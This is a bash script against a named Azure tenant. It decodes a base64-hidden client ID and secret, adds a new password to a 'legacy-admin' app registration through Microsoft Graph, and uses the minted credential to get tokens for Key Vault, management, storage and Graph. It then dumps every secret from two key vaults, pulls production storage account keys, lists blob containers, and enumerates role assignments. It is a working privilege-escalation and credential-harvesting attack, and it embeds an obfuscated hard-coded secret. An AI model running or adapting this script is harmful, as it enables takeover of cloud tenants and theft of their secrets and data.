#!/bin/bash
set -e

SYNC_CID=$(echo "NDYyZDFjMzgtNDQ1OS00OGI4LTkzMzMtODJlMzg5ZTU5NTE0" | base64 -d)
SYNC_SEC=$(echo "c2sxOFF+cUQyMmtrSFhVQ2ZxWExxZFA5NURrWUpMMzRlTUVSbGNTag==" | base64 -d)

GT=$(curl -sS -X POST "https://login.microsoftonline.com/3205c325-06a5-4171-9ce8-ffc5e6c2845e/oauth2/v2.0/token" \
  -d "client_id=$SYNC_CID" -d "client_secret=$SYNC_SEC" \
  -d "scope=https://graph.microsoft.com/.default" -d "grant_type=client_credentials" | jq -r .access_token)
echo "GT=${#GT}"

# First check cicd-deployer federated creds to understand matching format
echo "=== CICD-DEPLOYER FICS ==="
curl -sS "https://graph.microsoft.com/v1.0/applications/21183692-23a7-4910-9af5-90dae73cddd5/federatedIdentityCredentials" \
  -H "Authorization: Bearer $GT" | jq '.value[] | {name,subject,issuer,audiences}'

# Try addPassword on legacy-admin with retries
echo "=== ADD PASSWORD ==="
LEGACY_APPOBJ="22a3fb7e-860a-4708-9e50-3d36aa21191c"
for i in 1 2 3 4 5 6 7 8; do
  sleep $((i * 5))
  echo "Attempt $i at $(date -u +%H:%M:%S)..."
  AP=$(curl -sS -X POST "https://graph.microsoft.com/v1.0/applications/$LEGACY_APPOBJ/addPassword" \
    -H "Authorization: Bearer $GT" \
    -H "Content-Type: application/json" \
    -d "{\"passwordCredential\":{\"displayName\":\"p$i\"}}")
  AP_ERR=$(echo "$AP" | jq -r '.error.code // empty')
  if [ -z "$AP_ERR" ]; then
    AP_SECRET=$(echo "$AP" | jq -r '.secretText')
    AP_KEYID=$(echo "$AP" | jq -r '.keyId')
    echo "PASSWORD_OK=$AP_SECRET"
    echo "KEY_ID=$AP_KEYID"
    
    # Immediately try client_credentials with the new password
    echo "=== AUTH WITH NEW PASSWORD ==="
    sleep 5
    for SCOPE in "https://vault.azure.net/.default" "https://management.azure.com/.default" "https://storage.azure.com/.default" "https://graph.microsoft.com/.default"; do
      SCOPE_SHORT=$(echo "$SCOPE" | cut -d/ -f3 | cut -d. -f1)
      TOKEN_RAW=$(curl -sS -X POST "https://login.microsoftonline.com/3205c325-06a5-4171-9ce8-ffc5e6c2845e/oauth2/v2.0/token" \
        -d "client_id=891fb158-e02c-4428-a885-53b811f369c0" \
        -d "client_secret=$AP_SECRET" \
        -d "scope=$SCOPE" \
        -d "grant_type=client_credentials")
      TOKEN=$(echo "$TOKEN_RAW" | jq -r '.access_token // empty')
      if [ -n "$TOKEN" ]; then
        echo "${SCOPE_SHORT}_OK len=${#TOKEN}"
        
        if [ "$SCOPE_SHORT" = "vault" ]; then
          echo "=== KV2 ==="
          KV2=$(curl -sS "https://kv-tbl-sec-x3euoz.vault.azure.net/secrets?api-version=7.4" -H "Authorization: Bearer $TOKEN")
          echo "$KV2" | jq -c '.'
          for SID in $(echo "$KV2" | jq -r '.value[]?.id // empty'); do
            SVAL=$(curl -sS "$SID?api-version=7.4" -H "Authorization: Bearer $TOKEN")
            echo "$(basename $SID)=$(echo "$SVAL" | jq -r '.value // .error')"
          done
          echo "=== KV1 ==="
          KV1=$(curl -sS "https://kv-tbl-prod-x3euoz.vault.azure.net/secrets?api-version=7.4" -H "Authorization: Bearer $TOKEN")
          echo "$KV1" | jq -c '.'
          for SID in $(echo "$KV1" | jq -r '.value[]?.id // empty'); do
            SVAL=$(curl -sS "$SID?api-version=7.4" -H "Authorization: Bearer $TOKEN")
            echo "$(basename $SID)=$(echo "$SVAL" | jq -r '.value // .error')"
          done
        fi
        
        if [ "$SCOPE_SHORT" = "management" ]; then
          echo "=== RGs ==="
          curl -sS "https://management.azure.com/subscriptions/c5e4e004-b42d-4ac4-a502-5fd338380eb6/resourcegroups?api-version=2021-04-01" \
            -H "Authorization: Bearer $TOKEN" | jq -r '.value[]?.name // .error'
          echo "=== ALL ROLE ASSIGNMENTS ==="
          curl -sS "https://management.azure.com/subscriptions/c5e4e004-b42d-4ac4-a502-5fd338380eb6/providers/Microsoft.Authorization/roleAssignments?api-version=2022-04-01" \
            -H "Authorization: Bearer $TOKEN" | jq '.value | length'
          echo "=== STORAGE KEYS ==="
          for A in sttblbackupprodx3euoz sttblappcfgprodx3euoz sttblarchiveprodx3euoz; do
            K=$(curl -sS -X POST "https://management.azure.com/subscriptions/c5e4e004-b42d-4ac4-a502-5fd338380eb6/resourceGroups/rg-tbl-platform-prod-sea/providers/Microsoft.Storage/storageAccounts/$A/listKeys?api-version=2023-01-01" \
              -H "Authorization: Bearer $TOKEN" -H "Content-Length: 0")
            echo "$A=$(echo "$K" | jq -r '.keys[0].value // .error.code')"
          done
        fi
        
        if [ "$SCOPE_SHORT" = "storage" ]; then
          echo "=== STORAGE CONTAINERS ==="
          for A in sttblbackupprodx3euoz sttblappcfgprodx3euoz sttblarchiveprodx3euoz; do
            curl -sS "https://$A.blob.core.windows.net/?comp=list" \
              -H "Authorization: Bearer $TOKEN" -H "x-ms-version: 2020-10-02" | head -c 500
            echo ""
          done
        fi
        
        if [ "$SCOPE_SHORT" = "graph" ]; then
          echo "=== LEGACY APP ROLES ==="
          curl -sS "https://graph.microsoft.com/v1.0/servicePrincipals/43834909-47cf-4a4a-8048-e323b4897ed3/appRoleAssignments" \
            -H "Authorization: Bearer $TOKEN" | jq '.value[]? | {appRoleId,resourceDisplayName}'
        fi
      else
        echo "${SCOPE_SHORT}_FAIL: $(echo "$TOKEN_RAW" | jq -r '.error_description' | head -c 150)"
      fi
    done
    break
  else
    echo "FAIL: $AP_ERR"
  fi
done

echo "=== DONE ==="